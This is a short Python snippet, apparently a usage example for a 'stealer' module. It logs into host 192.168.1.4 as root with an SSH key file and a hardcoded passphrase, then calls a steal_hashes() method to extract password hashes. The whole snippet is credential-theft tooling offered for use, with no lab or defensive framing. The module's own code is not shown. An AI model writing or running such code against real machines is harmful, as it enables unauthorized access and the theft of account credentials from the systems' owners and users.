from stealer import Stealer
stlr = Stealer('192.168.1.4',username='root',key_file='./id_ecdsa',passphrase='s3cr3tphr4s3')
stlr.steal_hashes()
